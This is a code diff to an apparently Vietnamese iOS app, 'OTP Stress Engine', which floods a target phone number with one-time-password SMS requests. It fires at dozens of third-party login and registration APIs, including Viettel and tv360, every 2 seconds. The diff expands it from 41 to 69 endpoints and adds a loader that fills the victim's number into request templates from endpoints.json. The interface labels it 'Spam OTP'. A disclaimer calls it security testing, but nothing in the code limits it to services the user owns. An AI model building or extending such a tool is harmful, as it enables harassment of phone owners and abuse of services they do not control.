@@ -171,7 +171,7 @@
     
     // Ghi log khởi động
     [self logMessage:@"[SYSTEM] OTP Stress Engine v1.0.0 khởi động thành công."];
-    [self logMessage:@"[CONFIG] Đã sẵn sàng 41 Cổng API Spam OTP."];
+    [self logMessage:@"[CONFIG] Đã sẵn sàng 69 Cổng API Spam OTP (36 Cố định + 33 từ endpoints.json)."];
     [self logMessage:@"[STATUS] Nhập số điện thoại mục tiêu để bắt đầu."];
 }
 
@@ -272,7 +272,7 @@
     self.statusPill.layer.borderColor = [UIColor colorWithRed:0.15 green:0.65 blue:0.38 alpha:0.4].CGColor;
     
     self.statusPillLabel = [[UILabel alloc] initWithFrame:CGRectZero];
-    self.statusPillLabel.text = @"● 41 APIs Ready";
+    self.statusPillLabel.text = @"● 69 APIs Ready";
     self.statusPillLabel.font = [UIFont systemFontOfSize:11 weight:UIFontWeightSemibold];
     self.statusPillLabel.textColor = [UIColor colorWithRed:0.20 green:0.83 blue:0.55 alpha:1.0];
     self.statusPillLabel.textAlignment = NSTextAlignmentCenter;
@@ -431,7 +431,7 @@
     [self.loopContainer addSubview:self.loopTitleLabel];
     
     self.loopSubtitleLabel = [[UILabel alloc] initWithFrame:CGRectZero];
-    self.loopSubtitleLabel.text = @"Tự động lặp lại 41 API mỗi 2.0s";
+    self.loopSubtitleLabel.text = @"Tự động lặp lại 69 API mỗi 2.0s";
     self.loopSubtitleLabel.font = [UIFont systemFontOfSize:11 weight:UIFontWeightRegular];
     self.loopSubtitleLabel.textColor = [UIColor colorWithRed:0.58 green:0.64 blue:0.72 alpha:1.0];
     [self.loopContainer addSubview:self.loopSubtitleLabel];
@@ -545,7 +545,7 @@
     self.successLabel.lineBreakMode = NSLineBreakByWordWrapping;
     
     NSString *instructions = @"• Nhập đúng số điện thoại (định dạng 0xx.xxxxxxx).\n"
-                             @"• Nút Chạy: gửi 1 đợt kích hoạt đồng thời 41 cổng API.\n"
+                             @"• Nút Chạy: gửi 1 đợt kích hoạt đồng thời 69 cổng API (36 mặc định + 33 từ endpoints.json).\n"
                              @"• Nút Gạt: tự động gửi lặp lại liên tục sau mỗi 2.0 giây.\n"
                              @"• Miễn trừ trách nhiệm: Ứng dụng phục vụ mục đích kiểm thử bảo mật & benchmark dịch vụ.";
     
@@ -873,12 +873,12 @@
     
     self.currentHUD = [MBProgressHUD showHUDAddedTo:self.view animated:YES];
     self.currentHUD.mode = MBProgressHUDModeIndeterminate;
-    self.currentHUD.label.text = @"Đang Gửi 41 API Spam...";
+    self.currentHUD.label.text = @"Đang Gửi 69 API Spam...";
     self.currentHUD.bezelView.style = MBProgressHUDBackgroundStyleBlur;
     self.currentHUD.bezelView.backgroundColor = [UIColor colorWithRed:0.08 green:0.12 blue:0.18 alpha:0.85];
     self.currentHUD.contentColor = [UIColor whiteColor];
     
-    [self logMessage:[NSString stringWithFormat:@"[TRIGGER] Bắt đầu kích hoạt 41 API tới: %@", phone]];
+    [self logMessage:[NSString stringWithFormat:@"[TRIGGER] Bắt đầu kích hoạt 69 API tới: %@", phone]];
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         [self sendOTPAndNewOTPRequests];
@@ -1017,10 +1017,81 @@
     [MBProgressHUD hideHUDForView:self.view animated:YES];
 }
 
-#pragma mark - All 41 API Requests Dispatcher
+#pragma mark - Dynamic Endpoints Loader
+
+- (NSArray<NSDictionary *> *)loadEndpointsList {
+    NSString *filePath = [[NSBundle mainBundle] pathForResource:@"endpoints" ofType:@"json"];
+    NSData *data = nil;
+    if (filePath) {
+        data = [NSData dataWithContentsOfFile:filePath];
+    }
+    if (!data || data.length == 0) {
+        NSString *fallbackPath = [NSString stringWithFormat:@"%@/endpoints.json", [[NSBundle mainBundle] bundlePath]];
+        data = [NSData dataWithContentsOfFile:fallbackPath];
+    }
+    if (data && data.length > 0) {
+        NSError *error = nil;
+        NSArray *jsonArray = [NSJSONSerialization JSONObjectWithData:data options:0 error:&error];
+        if ([jsonArray isKindOfClass:[NSArray class]]) {
+            return jsonArray;
+        }
+    }
+    return @[];
+}
+
+- (void)sendDynamicEndpointsRequests {
+    NSArray<NSDictionary *> *endpoints = [self loadEndpointsList];
+    NSString *phoneNumber = self.phoneTextField.text ?: @"";
+    if (phoneNumber.length == 0 || endpoints.count == 0) return;
+    
+    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
+    config.timeoutIntervalForRequest = 10.0;
+    NSURLSession *session = [NSURLSession sessionWithConfiguration:config];
+    
+    for (NSDictionary *item in endpoints) {
+        NSString *name = item[@"name"] ?: @"Endpoint";
+        NSString *rawUrl = item[@"url"];
+        if (!rawUrl || ![rawUrl isKindOfClass:[NSString class]]) continue;
+        
+        NSString *urlString = [rawUrl stringByReplacingOccurrencesOfString:@"{PHONE}" withString:phoneNumber];
+        NSURL *url = [NSURL URLWithString:urlString];
+        if (!url) continue;
+        
+        NSString *method = [item[@"method"] uppercaseString] ?: @"POST";
+        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+        [request setHTTPMethod:method];
+        
+        NSDictionary *headers = item[@"headers"];
+        if ([headers isKindOfClass:[NSDictionary class]]) {
+            for (NSString *key in headers) {
+                [request setValue:headers[key] forHTTPHeaderField:key];
+            }
+        }
+        
+        if (![method isEqualToString:@"GET"]) {
+            NSString *bodyTemplate = item[@"body_template"];
+            if ([bodyTemplate isKindOfClass:[NSString class]] && bodyTemplate.length > 0) {
+                NSString *bodyString = [bodyTemplate stringByReplacingOccurrencesOfString:@"{PHONE}" withString:phoneNumber];
+                [request setHTTPBody:[bodyString dataUsingEncoding:NSUTF8StringEncoding]];
+            }
+        }
+        
+        NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+            if (error) {
+                [self logMessage:[NSString stringWithFormat:@"%@ Error: %@", name, error.localizedDescription]];
+            } else {
+                NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
+                [self logMessage:[NSString stringWithFormat:@"%@ Response: %ld", name, (long)httpResponse.statusCode]];
+            }
+        }];
+        [task resume];
+    }
+}
+
+#pragma mark - All 69 API Requests Dispatcher
 
 - (void)sendOTPAndNewOTPRequests {
-    // 36 Legacy Endpoints
+    // 36 Cổng API cố định
     [self tv360];
     [self viettel_login_dang_nhap];
     [self viettel_tao_tai_khoan];
@@ -1058,12 +1129,8 @@
     [self tokyolife];
     [self go2joy];
     
-    // 5 New Endpoints from endpoints.json
-    [self adiraku];
-    [self singa];
-    [self pinhome];
-    [self maulagi];
-    [self saturdays];
+    // 33 Cổng API động từ endpoints.json
+    [self sendDynamicEndpointsRequests];
 }
 
 #pragma mark - Import Endpoints Implementation
